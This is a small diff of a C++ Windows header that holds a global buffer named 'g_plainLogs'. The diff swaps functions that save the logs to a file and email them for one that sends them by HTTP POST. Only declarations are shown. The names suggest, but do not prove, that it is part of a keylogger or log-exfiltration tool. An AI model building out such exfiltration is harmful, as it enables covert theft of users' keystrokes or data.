@@ -4,11 +4,10 @@
 #include <vector>
 #include <Windows.h>
 
-inline std::vector<BYTE> g_plainLogs;
+inline std::vector<char> g_plainLogs;
 inline std::mutex g_logMutex;
 
 
-void save_logs_to_file();
-void send_email();
+bool send_via_post(const std::vector<char>& logs);
 
 #endif //MEMORY_H
